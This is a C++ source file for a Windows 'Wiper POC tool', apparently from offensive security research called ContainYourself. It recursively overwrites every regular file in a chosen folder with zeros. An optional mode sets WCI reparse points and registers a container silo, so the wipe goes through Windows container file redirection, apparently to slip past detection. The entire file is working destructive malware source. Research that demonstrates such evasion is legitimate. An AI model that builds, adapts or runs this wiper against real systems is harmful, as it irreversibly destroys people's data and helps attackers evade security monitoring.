#pragma once
#include <filesystem>
#include <fstream>
#include <iostream>
#include <set>
#include <string>
#include <Windows.h>

#include "../ContainYourself/ContainYourself.h"

using std::string;
using std::wstring;
using std::wcout;
using std::endl;
using std::ifstream;
using std::ofstream;
using std::filesystem::recursive_directory_iterator;
using std::exception;

const wstring MAIN_VOLUME(L"C:");
const wstring TEMP_FOLDER(MAIN_VOLUME + L"\\temp");
const wstring TEMP_FILE_RELATIVE_PATH(L"\\temp\\ContainYourselfTempFile.txt");
constexpr DWORD MAX_FILE_SIZE = 10000000; //10MB

wstring g_FolderToEncrypt;
bool g_UseContainYourselfWrite = false;

constexpr bool IsCmdOptionExists(wchar_t** Begin, wchar_t** End, const std::wstring& Option) { return std::find(Begin, End, Option) != End; }

constexpr wstring GetCmdOption(wchar_t** Begin, wchar_t** End, const std::wstring& Option)
{
    wchar_t** itr = std::find(Begin, End, Option);
    if (itr != End && ++itr != End)
        return *itr;

    return L"";
}

struct HandleDeleter
{
    void operator()(const HANDLE& Handle) const
    {
        if (INVALID_HANDLE_VALUE != Handle && nullptr != Handle)
            CloseHandle(Handle);
    }
};

using AutoHandle = std::unique_ptr<void, HandleDeleter>;

void WipeFile(const wstring& FilePathToEncrypt)
{
	const AutoHandle fileAutoHandle(CreateFileW(FilePathToEncrypt.c_str(),
	                                            GENERIC_READ | GENERIC_WRITE,
	                                            0,
	                                            nullptr,
	                                            OPEN_EXISTING,
	                                            FILE_ATTRIBUTE_NORMAL,
	                                            nullptr));

    if (INVALID_HANDLE_VALUE == fileAutoHandle.get())
    {
        return;
    }

    DWORD bytesRead;

    if (g_UseContainYourselfWrite)
    {
        ContainYourself::SetWciReparsePoint(fileAutoHandle.get(), TEMP_FILE_RELATIVE_PATH, IO_REPARSE_TAG_WCI_1);
        return;
    }

    const auto fileSize = GetFileSize(fileAutoHandle.get(), nullptr);
    if (0 == fileSize || INVALID_FILE_SIZE == fileSize || MAX_FILE_SIZE < fileSize)
    {
        return;
    }

    const std::unique_ptr<BYTE> fileData(new BYTE[fileSize]);
    memset(fileData.get(), 0, fileSize);

    SetFilePointer(fileAutoHandle.get(), 0, nullptr, FILE_BEGIN);

    if (WriteFile(fileAutoHandle.get(), fileData.get(), fileSize, &bytesRead, nullptr))
        wcout << L"[+] File wiped: " << FilePathToEncrypt << endl;
}

void WipeFolder(const wstring& FolderPath)
{
    auto wipedFiles = 0;
	try
	{
        for (auto& directoryEntry : recursive_directory_iterator(FolderPath, std::filesystem::directory_options::skip_permission_denied))
        {
            try
            {
                if (directoryEntry.is_regular_file())
                {
                    WipeFile(directoryEntry.path());
                    wipedFiles++;
                }
            }
            catch (...) {}
        }
	}
    catch (const std::filesystem::filesystem_error& ex)
    {
        cout << "[-] " << ex.what() << endl;
        return;
    }
    catch (...)
    {
        cout << "[-] Unknown error when traversing directory." << endl;
        return;
    }

    if (g_UseContainYourselfWrite)
    {
        cout << "[+] Reparse point set to " << wipedFiles << " files." << endl;

        HANDLE siloHandle;
	    try
	    {
            ContainYourself::InitContainer(GetCurrentProcess(), ContainerUsage::FileOverride, &siloHandle);
	    }
        catch (std::exception& e)
        {
            cout << e.what() << endl;
            return;
        }
	    catch (...)
	    {
            cout << "[-] Unknown error when creating container." << endl;
            return;
	    }

        cout << "[+] Container created and registered." << endl;

        cout << "[+] Press any key to start wiping using ContainYourself..." << endl;
        getchar();

        AutoHandle fileToWipeAutoHandle;
        try
        {
            for (auto& directoryEntry : recursive_directory_iterator(FolderPath, std::filesystem::directory_options::skip_permission_denied))
            {
                fileToWipeAutoHandle.reset(CreateFileW(directoryEntry.path().c_str(),
                    GENERIC_READ | GENERIC_WRITE,
                    0,
                    nullptr,
                    OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL,
                    nullptr));

                if (INVALID_HANDLE_VALUE != fileToWipeAutoHandle.get())
                    wcout << L"[+] File wiped: " << directoryEntry.path() << endl;
            }
        }
        catch (const std::filesystem::filesystem_error& ex)
        {
            cout << "[-] " << ex.what() << endl;
        }
        catch (...)
        {
            cout << "[-] Unknown error when traversing directory." << endl;
        }
    }
}

int wmain(int argc, wchar_t* argv[])
{
    if (IsCmdOptionExists(argv, argv + argc, L"-h") || IsCmdOptionExists(argv, argv + argc, L"/h"))
    {
        wcout << "Wiper POC tool that wipes a given directory." << endl << endl;
        wcout << "Command line arguments:" << endl;
        wcout << "	-f  - Target folder to wipe" << endl;
        wcout << "	-c  - [optional] Use ContainYourself write method" << endl;

        return -1;
    }

    g_FolderToEncrypt = GetCmdOption(argv, argv + argc, L"-f");
    g_UseContainYourselfWrite = IsCmdOptionExists(argv, argv + argc, L"-c");

    if (g_FolderToEncrypt.empty())
    {
        cout << "[-] Excpected a folder to encrypt. Use -f." << endl << endl;
        return -1;
    }

    if (g_UseContainYourselfWrite)
    {
        CreateDirectoryW((MAIN_VOLUME + TEMP_FOLDER).c_str(), nullptr);

        const auto targetFileHandle = CreateFileW((MAIN_VOLUME + TEMP_FILE_RELATIVE_PATH).c_str(),
                                                  GENERIC_READ | GENERIC_WRITE,
                                                  0,
                                                  nullptr,
                                                  CREATE_ALWAYS,
                                                  FILE_ATTRIBUTE_NORMAL,
                                                  nullptr);

        constexpr char zeroBuffer[1024]{};
        DWORD bytes;
        if (!WriteFile(targetFileHandle, zeroBuffer, sizeof(zeroBuffer), &bytes, nullptr))
        {
            cout << "[-] Error writing empty buffer to target file." << endl;
            return -1;
        }

        CloseHandle(targetFileHandle);

        cout << "[+] Target file created." << endl;
        cout << "[+] Setting reparse points to files in directory..." << endl;
    }
    
    WipeFolder(g_FolderToEncrypt);

    cout << "[+] Done." << endl;
}